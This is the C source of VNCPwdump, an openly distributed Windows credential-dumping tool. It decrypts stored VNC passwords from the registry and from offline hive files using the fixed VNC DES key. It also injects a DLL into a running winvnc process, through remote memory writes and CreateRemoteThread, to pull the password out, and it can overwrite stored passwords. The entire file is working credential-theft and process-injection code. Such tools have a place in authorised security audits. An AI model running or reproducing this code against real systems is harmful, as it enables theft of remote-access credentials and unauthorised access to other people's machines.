/*
   VNC Password Dumper
   Copyright (c) 2006- Patrik Karlsson

   http://www.cqure.net

   DLL injection code is based on the pwdump2 code by Todd A. Sabin

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   
   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/


#include <stdio.h>
#include <windows.h>
#include <winnt.h>
#include <winreg.h>

#include "vncpwdump.h"
#include "getpid.h"
#include "getopt.h"
#include "d3des.h"
#include "registry.h"

char *pBanner = "\nVNCPwdump v.1.0.5 by patrik@cqure.net\n"
				"-------------------------------------\n";

struct keylist *pVNCKeys = NULL;

DWORD SetPrivilege(LPCTSTR Privilege);
void DecryptPw( char * );

static DWORD RemoteFunction (REMOTE_INFO *pInfo) {

    HINSTANCE hDll;
    pVNCDump_t pVNCDump;
    int rc = -1;

    hDll = pInfo->pLoadLibrary (pInfo->szDllName);
    if (hDll != NULL)
    {
        pVNCDump = (pVNCDump_t) pInfo->pGetProcAddress (hDll, pInfo->szProcName);
        if (pVNCDump != 0) {
            rc = pVNCDump (pInfo->szPipeName );
        }
        pInfo->pFreeLibrary (hDll);
    }
    return rc;
}

static void DummyFunc (void)
{
    return;
}

/*
 * DLL injection code based on code by Todd Sabin's pwdump2
 *
 */
HANDLE InjectDll (HANDLE hProc, LPVOID pRemoteAlloc ) {

    DWORD dwFuncSize;
    DWORD dwBytesToAlloc;
    REMOTE_INFO remInfo;
    HINSTANCE hKernel32;
    CHAR szDllName[MAX_PATH];
    DWORD dwBytesWritten;
    HANDLE hRemoteThread = 0;
    DWORD dwIgnored;

	HANDLE hPipe = NULL;

	pRemoteAlloc = NULL;

    hKernel32 = LoadLibrary ("Kernel32");
    remInfo.pLoadLibrary = (pLoadLib_t) GetProcAddress (hKernel32, "LoadLibraryA");
    remInfo.pGetProcAddress = (pGetProcAddr_t) GetProcAddress (hKernel32, "GetProcAddress");
    remInfo.pFreeLibrary = (pFreeLib_t) GetProcAddress (hKernel32, "FreeLibrary");

    GetModuleFileName (NULL, szDllName, sizeof (szDllName));
    strcpy (strrchr (szDllName, '\\') + 1, "vncdumpdll.dll");
    strncpy (remInfo.szDllName, szDllName, sizeof (remInfo.szDllName));
    strncpy (remInfo.szProcName, "VNCDump", sizeof (remInfo.szProcName));
	_snprintf (remInfo.szPipeName, sizeof (remInfo.szPipeName),
               "\\\\.\\pipe\\vncdump-%d", GetCurrentProcessId ());

    dwFuncSize = (DWORD)DummyFunc - (DWORD)RemoteFunction;
    dwBytesToAlloc = dwFuncSize + sizeof (REMOTE_INFO) + 4;
    pRemoteAlloc = VirtualAllocEx (hProc, NULL, dwBytesToAlloc,
                                   MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
	if (pRemoteAlloc == NULL) {
        fprintf (stderr, "VirtualAllocEx failed: %d\n",
                 GetLastError ());
        return NULL;
    }
    
    if (!WriteProcessMemory (hProc, pRemoteAlloc, &remInfo, sizeof (remInfo),
                             &dwBytesWritten))
    {
        fprintf (stderr, "WriteProcessMemory failed: %d\n",
                 GetLastError ());
        return NULL;
    }

    if (!WriteProcessMemory (hProc,
                             (PBYTE)pRemoteAlloc + sizeof (REMOTE_INFO) + 4,
                             (LPVOID)(DWORD)RemoteFunction, dwFuncSize,
                             &dwBytesWritten))
    {
        fprintf (stderr, "WriteProcessMemory failed: %d\n",
                 GetLastError ());
        return NULL;
    }

    hRemoteThread = CreateRemoteThread (hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)((PBYTE) pRemoteAlloc + sizeof (REMOTE_INFO) + 4),
                                        pRemoteAlloc, 0, &dwIgnored);
    if (!hRemoteThread) {
        fprintf (stderr, "CreateRemoteThread failed: %d\n", GetLastError ());
        return NULL;
    }

	return hRemoteThread;

}

/*
 * Translate the error code to a message
 *
 */
void errormsg( long lErr ) {

	LPVOID lpMsgBuf;
	
	if (!FormatMessage( 
		FORMAT_MESSAGE_ALLOCATE_BUFFER | 
		FORMAT_MESSAGE_FROM_SYSTEM | 
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		lErr,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		(LPTSTR) &lpMsgBuf,
		0,
		NULL ))
	{		
		return;
	}

	fprintf(stderr, "%s\n", (LPCTSTR)lpMsgBuf);


}

/*
 * Sets appropriate priviliges for current process
 *
 */
DWORD SetPrivilege( LPCTSTR pPriv ) {
    
    HANDLE hToken = 0;
    DWORD dwError = 0;
    TOKEN_PRIVILEGES privileges;

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        dwError = GetLastError();
        goto exit;
    }

    if(!LookupPrivilegeValue(NULL, pPriv, &privileges.Privileges[0].Luid))
    {
        dwError = GetLastError();
        goto exit;
    }

    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    privileges.PrivilegeCount = 1;
    
    if(!AdjustTokenPrivileges(hToken, FALSE, &privileges, 0, NULL, NULL))
    {
        dwError = GetLastError();
        goto exit;
    }

 exit:
    if(hToken) 
		CloseHandle(hToken);

    return dwError;
}

/*
 * Open a datfile, retrieve and decrypt pw
 *
 */
void DumpFromDat(char sFileName[MAX_PATH]) {

	LONG lRet, lPwLen = 0;
	CHAR *pVNCBaseKey = "vnc_haxxor";
	CHAR *pEncPw;
	CHAR vnckey[200];

	struct keylist *p = pVNCKeys;

    if( 0 != SetPrivilege(SE_RESTORE_NAME) ) {
        fprintf(stderr, "ERROR: Failed to SetPrivilege");
        return;
    }

	if( 0 != SetPrivilege(SE_BACKUP_NAME) ) {
        fprintf(stderr, "ERROR: Failed to SetPrivilege");
        return;
    }
	
	if ( ERROR_SUCCESS != ( lRet = RegLoadKey( HKEY_USERS, pVNCBaseKey, sFileName) ) ) {
		errormsg( lRet );
		return;
	}

	while ( p ) {

		ZeroMemory( vnckey, sizeof( vnckey ) );
		
		if ( strlen( p->pKeyValue ) > ( sizeof( vnckey ) - strlen( pVNCBaseKey ) - 1 - 1 ) ) {
			fprintf( stderr, "ERROR: VNC registry key too long\n" );
			continue;
		}

		strcpy( vnckey, pVNCBaseKey );
		strcat( vnckey, "\\" );
		strcat( vnckey, p->pKeyValue );

		pEncPw = (CHAR *)GetRegistryString( HKEY_USERS, vnckey, "Password" );

		if ( NULL != pEncPw ) {
			DecryptPw( pEncPw );
			free( pEncPw );
			break;
		}
	
		p = p->next;
	}

	RegUnLoadKey( HKEY_USERS, pVNCBaseKey );

}

/*
 * Create incoming named pipe
 *
 */
HANDLE CreateInNamedPipe() {

    CHAR szPipeName[MAX_PATH];
	HANDLE hPipe;

    _snprintf (szPipeName, sizeof (szPipeName),
               "\\\\.\\pipe\\vncdump-%d", GetCurrentProcessId ());

	hPipe = CreateNamedPipe (szPipeName,
								PIPE_ACCESS_INBOUND | FILE_FLAG_WRITE_THROUGH,
								PIPE_TYPE_BYTE | PIPE_WAIT,
								2, DUMP_PIPE_SIZE, DUMP_PIPE_SIZE,
								10000, NULL);

    if (!hPipe) {
        fprintf (stderr, "Failed to create the pipe: %d\n",
                 GetLastError ());
        return 0;
    }


	return hPipe;

}

/*
 * Listen on incoming namedpipe
 *
 */
DWORD WINAPI ListenForPassword(HANDLE *hIn) {

	DWORD dwRead;
	char buf[2048];
	
	if ( !ConnectNamedPipe( *hIn, 0 ) ) {
		fprintf(stderr, "ERROR: Failed to connect to pipe %X\n", *hIn );
		return -1;
	}

	ReadFile( *hIn, buf, sizeof(buf), &dwRead, 0 );
	fprintf( stdout, "%s", pBanner );
	fprintf( stdout, "Password: %s\n", buf );

	return 0;

}

/*
 * Inject inside running vnc process and dump its registry keys
 *
 */


void InjectVNC() {

	DWORD dwPid = 0, dwErr = 0, dwThread = 0;
	CHAR *procVNC = "winvnc.exe";
	CHAR *procVNC4 = "winvnc4.exe";
	HANDLE hProc;
	HANDLE hToken = 0;
	HANDLE hInPipe = 0;
	HANDLE hRemoteThread;
	HANDLE hInThread;
    LPVOID pRemoteAlloc = NULL;

    if (!OpenProcessToken (GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		fprintf(stderr, "ERROR: Failed to acquire token\n");
		exit(1);
	}

	if ( 0 != SetPrivilege( SE_DEBUG_NAME ) ) {
		fprintf(stderr, "WARNING: Failed to set SE_DEBUG_NAME privilege\n");
	}

	/*  NOTE to self.

		First try winvnc.exe then winvnc4.exe. This is an ungly kludge and should rather be done
		using regexp. But who has the time now a days?
	*/
	if ( 0 == ( dwPid = GetPidByName( procVNC ) ) )
		dwPid = GetPidByName( procVNC4 );
	
	if ( 0 == dwPid ) {
		fprintf(stderr, "ERROR: Failed to find VNC process\n" );
		exit(1);
	}

    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    
	if (hProc == 0) {
        dwErr = GetLastError ();
        fprintf (stderr, "Failed to open process (%d): %d.  Exiting.\n", dwPid, dwErr);
        exit (1);
    }


	hInPipe = CreateInNamedPipe();

	if ( !hInPipe )
		exit(1);

	hInThread = CreateThread( NULL, 0, ListenForPassword, &hInPipe, 0, &dwThread );
    hRemoteThread  = InjectDll (hProc, pRemoteAlloc);

	if ( !hRemoteThread ) {
		fprintf( stderr, "ERROR: Failed to InjectDll\n");
		exit(1);
	}

	WaitForSingleObject( hInThread, INFINITE );


}

/*
 * unsigned char *char2hex(char *chr, int nLen)
 *
 * converts a 'string' to a hexarray
 *
 */
unsigned char *char2hex(char *chr, int nLen) {

	int i;
	unsigned char hex[2];
	unsigned char *retHex;
	unsigned int hex3;

	retHex = (unsigned char *) malloc( nLen ); /* should be nLen / 2 */
	memset( retHex, 0, nLen );

	for ( i=0; i<nLen; i ++ ) {
		memset( hex, 0, sizeof( hex ) );
		memcpy( hex, chr + i, 2 );
		sscanf( hex, "%2x", &hex3);
		retHex[i/2]=hex3;
		i++;
	}

	return retHex;

}

/*
 * Decrypts and prints the VNC password
 *
 */
void DecryptPw( char *pPW ) {

	char clrtxt[10];
	
	deskey(ObfKey, DE1);
    des(pPW, clrtxt);
	clrtxt[8] = 0;

	fprintf(stdout, "Password: %s\n", clrtxt);

}

CHAR *EncryptClear( CONST CHAR *pClear ) {

	const size = 9;
	u_char *pPlain;

	pPlain = (u_char *)malloc( size ); 
	ZeroMemory( pPlain, size );
	strncpy( pPlain, pClear, size - 1 );
	deskey( ObfKey, EN0 );
	des( pPlain, pPlain );
	
	return pPlain;
}

void DecryptRegPw( char *pPW ) {

	unsigned char *pClear;
	pClear = char2hex( pPW, 16 );
	DecryptPw( pClear );
	free( pClear );

}


/*
 * Dumps and decrypts the current users VNC password
 *
 */
void DecryptCurrentUserPw() {

	CHAR *pEncPw = NULL;
	struct keylist *p = pVNCKeys;

	while ( p ) {

		pEncPw = GetRegistryString( HKEY_CURRENT_USER, p->pKeyValue, "Password" );
	
		if ( NULL != pEncPw ) {
			DecryptPw( pEncPw );
			break;
		}

		p = p->next;
	}

	if ( pEncPw != NULL ) {
		free( pEncPw );
	}
	else {
		fprintf( stderr, "ERROR: Found no password for current user\n" );
	}

}

/*
 * Dumps and decrypts the current users VNC password
 *
 */
void DecryptLocalMachinePw() {

	CHAR *pEncPw = NULL;
	struct keylist *p = pVNCKeys;

	while ( p ) {

		pEncPw = GetRegistryString( HKEY_LOCAL_MACHINE, p->pKeyValue, "Password" );
	
		if ( NULL != pEncPw ) {
			DecryptPw( pEncPw );
			break;
		}

		p = p->next;
	}

	if ( pEncPw != NULL ) {
		free( pEncPw );
	}
	else {
		fprintf( stderr, "ERROR: Found no password for current user\n" );
	}

}

/*
 * Usage information
 *
 */
void usage(char *pProg) {

	fprintf(stderr, "\n");
	fprintf(stderr, "%s", pBanner);
	fprintf(stderr, "%s [[-c] | [-r file] | [-d] | [-k key] | [-e plain] | [-S plain] | [-C plain]] [-V version]\n", pProg );
	fprintf(stderr, "\n");
	fprintf(stderr, "   -c decrypt the current users password (HKEY_CURRENT_USER)\n");
	fprintf(stderr, "   -s decrypt the service password (HKEY_LOCAL_MACHINE)\n");
	fprintf(stderr, "   -r decrypts password in <file>\n");
	fprintf(stderr, "   -d dumps the password by injecting into running process\n");
	fprintf(stderr, "   -k decrypts the <key>\n");
	fprintf(stderr, "   -e encrypts the <plain> password\n");
	fprintf(stderr, "   -S sets the service password\n" );
	fprintf(stderr, "   -C sets the current users password\n" );
//	fprintf(stderr, "   -V force VNC version\n" );

}

VOID SetVNCPassword( HKEY h, u_char *pClear, int nLen ) {

	struct keylist *p = pVNCKeys;
	LONG lErr;

	while ( p ) {

		if ( ERROR_SUCCESS == ( lErr = SetRegistryValue( h, p->pKeyValue, "Password", pClear, nLen ) ) ) {
			break;
		}

		p = p->next;
	
	}

	if ( ERROR_SUCCESS != lErr )
		fprintf( stderr, "ERROR: SetVNCPassword failed\n" );
	else
		fprintf( stdout, "Password successfully set\n" );
}

CHAR *DeHexify( u_char *pHex, int nLen ) {

	u_char *pStr;
	int i;

	pStr = (CHAR *) malloc( nLen * 2 ) + 1;
	ZeroMemory( pStr, nLen * 2 + 1 );

	for ( i=0; i<nLen; i++ ) {
		sprintf( pStr + i * 2, "%X", pHex[i] );
	}

	return pStr;
}

/*
 * ..... no comment .....
 *
 */
int main( int argc, char **argv ) {

	int c;
	u_char *pKey, *pHex;

	pVNCKeys = (struct keylist *)AddListItem( pVNCKeys, VNC3_REGPATH );
	pVNCKeys = (struct keylist *)AddListItem( pVNCKeys, VNC4_REGPATH );

	fprintf(stdout, "%s", pBanner );

	while (1) {

		c = getopt (argc, argv, "r:dk:ce:sS:C:");

	    if ( c == -1 )
			break;

		switch (c) {
      
			case 'e':
				if ( 0 != strlen( optarg ) ) {
					pKey = EncryptClear( optarg );
					pHex = DeHexify(pKey, 8);
					fprintf( stdout, "key: %s\n", pHex );
					free( pHex );
					free( pKey );
				}
				break;
			case 'c':
				DecryptCurrentUserPw();
				break;
			case 'C':
				SetVNCPassword( HKEY_CURRENT_USER, EncryptClear( optarg ), 8 );
				break;
			case 'S':
				SetVNCPassword( HKEY_LOCAL_MACHINE, EncryptClear( optarg ), 8 );
				break;
		    case 'r':
				DumpFromDat( optarg );	
				break;
			case 's':
				DecryptLocalMachinePw();
				break;
			case 'd':
				InjectVNC();
				break;
			case 'k':
				DecryptRegPw( optarg );
				break;
			default:
				usage( argv[0] );
				goto quit;

		}

	}

	if ( argc < 2 ) {
		usage( argv[0] );
	}

quit:
	FreeList( pVNCKeys );

}